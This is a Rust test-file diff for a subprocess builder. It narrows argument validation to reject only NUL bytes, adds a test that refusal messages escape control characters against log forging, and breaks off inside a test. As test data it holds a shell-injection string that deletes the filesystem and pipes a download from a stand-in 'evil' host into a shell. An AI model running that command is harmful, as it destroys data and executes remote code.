@@ -401,45 +401,69 @@ fn spawn_detached_launches_and_returns() {
 }
 
 #[test]
-fn forbidden_control_byte_in_program_rejected() {
-    for forbidden in ['\u{0}', '\n', '\r', '\u{7f}'] {
-        let spec = BigSubprocessSpec::builder()
-            .program(format!("ec{forbidden}ho"))
-            .build();
-        let err = spec.try_resolved().unwrap_err();
-        assert!(
-            matches!(err, BigSubprocessError::ForbiddenArgvByte { index: 0, byte } if byte == forbidden as u8),
-            "byte {:#04x} must be rejected at the program field, got {err:?}",
-            forbidden as u32
-        );
-    }
-}
-
-#[test]
-fn argv_control_byte_reports_index() {
-    let spec = BigSubprocessSpec::builder()
-        .program("echo")
-        .arg("clean")
-        .arg("bad\ninjection")
-        .build();
+fn nul_in_program_rejected() {
+    let spec = BigSubprocessSpec::builder().program("ec\0ho").build();
     let err = spec.try_resolved().unwrap_err();
-    // argv[1] (the second token) carries the newline → reported index 2.
     assert!(
         matches!(
             err,
-            BigSubprocessError::ForbiddenArgvByte {
-                index: 2,
-                byte: 0x0a
-            }
+            BigSubprocessError::ForbiddenArgvByte { index: 0, byte: 0 }
         ),
         "got {err:?}"
     );
 }
 
 #[test]
+fn argv_nul_reports_index() {
+    let spec = BigSubprocessSpec::builder()
+        .program("echo")
+        .arg("clean")
+        .arg("bad\0tail")
+        .build();
+    let err = spec.try_resolved().unwrap_err();
+    // argv[1] (the second token) carries the NUL → reported index 2.
+    assert!(
+        matches!(
+            err,
+            BigSubprocessError::ForbiddenArgvByte { index: 2, byte: 0 }
+        ),
+        "got {err:?}"
+    );
+}
+
+/// A Linux file name may hold any byte but NUL and `/`; POSIX `printf %s`
+/// writes its argument back unchanged.
+#[test]
+fn file_name_bytes_reach_child() {
+    let name = "line\nbreak\rreturn\x7fdelete";
+    let output = BigSubprocessSpec::builder()
+        .program("printf")
+        .arg("%s")
+        .arg(name)
+        .build()
+        .run()
+        .expect("printf runs");
+    assert!(output.status.success());
+    assert_eq!(output.stdout, name.as_bytes());
+}
+
+#[test]
+fn refusal_message_escapes_control_bytes() {
+    let err = BigSubprocessSpec::builder()
+        .program("rm\nforged log line")
+        .allow_list(["ffprobe"])
+        .build()
+        .try_resolved()
+        .unwrap_err();
+    let message = err.to_string();
+    assert!(!message.contains('\n'), "{message}");
+    assert!(message.contains(r"rm\nforged"), "{message}");
+}
+
+#[test]
 fn shell_metacharacters_pass_validation() {
-    // Shell metacharacters are data (no shell is used); only control bytes are
-    // rejected, so a clean-but-spicy argv must resolve OK.
+    // Shell metacharacters are data (no shell is used); only NUL is rejected,
+    // so a clean-but-spicy argv must resolve OK.
     let spec = BigSubprocessSpec::builder()
         .program("echo")
         .arg("; rm -rf / && curl evil | sh")
